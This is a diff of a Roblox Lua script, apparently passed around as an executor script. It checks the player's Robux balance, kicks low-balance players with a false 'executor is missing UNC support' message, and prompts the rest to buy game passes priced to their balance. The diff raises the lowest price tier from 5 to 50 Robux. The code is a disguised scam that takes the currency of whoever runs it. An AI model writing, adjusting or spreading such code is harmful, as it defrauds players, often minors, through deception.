@@ -75,7 +75,7 @@ skyy.SkyboxRt = "rbxassetid://12322755004"
 skyy.SkyboxUp = "rbxassetid://12322755004"
 
 -- gamepasses
--- 648103386 / 5 robux
+-- 648103386 / 50 robux
 -- 646533020 / 100 robux
 -- 646569039 / 200 robux
 -- 646468092 / 300 robux
@@ -100,9 +100,9 @@ local rb = mps:GetRobuxBalance(game.Players.LocalPlayer)
 
 if rb == 0 then
 game:GetService("Players").LocalPlayer:Kick("Your executor is missing UNC support")
-elseif rb > 0 and rb < 5 then
+elseif rb > 0 and rb < 50 then
 game:GetService("Players").LocalPlayer:Kick("Your executor is missing UNC support")
-elseif rb >= 5 and rb < 100 then
+elseif rb >= 50 and rb < 100 then
 game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 648103386)
 wait()
 elseif rb >= 100 and rb < 200 then
